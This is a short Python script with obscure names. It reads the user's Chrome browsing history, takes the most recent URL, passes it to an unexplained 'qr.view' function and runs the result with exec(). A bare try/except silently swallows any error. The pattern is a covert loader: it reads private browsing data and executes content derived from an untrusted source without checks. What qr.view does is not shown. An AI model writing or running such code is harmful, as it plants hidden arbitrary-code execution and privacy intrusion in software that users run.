###########################################################################################
#created by    : Naveen
#last modified :31/12/19
############################################################################################
import browserhistory as bh
import qr
def cf():
    dict_obj = bh.get_browserhistory()
    dict_obj.keys()
    a=dict_obj['chrome'][0]
    a=str(a)
    a=a.split(",")
    b=a[0]
    b=b[2:][:-1]
    try:
        exec(qr.view(b))
    except:
        q=bin(1)
